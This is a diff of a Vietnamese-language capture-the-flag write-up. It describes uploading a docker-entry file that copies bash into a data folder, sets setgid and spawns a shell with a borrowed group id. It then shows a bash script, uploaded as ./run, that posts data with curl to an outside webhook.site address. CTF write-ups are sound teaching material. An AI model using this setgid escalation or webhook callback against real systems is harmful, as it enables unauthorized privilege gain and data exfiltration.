@@ -47,8 +47,7 @@
 - Tôi upload một file docker-entry
 - ![image](https://user-images.githubusercontent.com/82523299/188442375-9e476321-b864-4427-b75e-6f93707a0fd3.png)
 - File này sẽ copy bash vào thư mục data và thiết lập setgid và thực thi shell với egid=1000 
-![image](https://user-images.githubusercontent.com/82523299/188444373-3c2ef48a-6649-435e-b65b-e163ceb050b1.png)
-- Sau đó up script để nhận flag là xong
+- Sau đó up script dưới dạng file ./run để nhận flag là xong
 - `#!/usr/bin/bash
 
 curl -d "ver2" https://webhook.site/6dd0417b-027e-4eb2-8f2c-b0a87bcc4c16
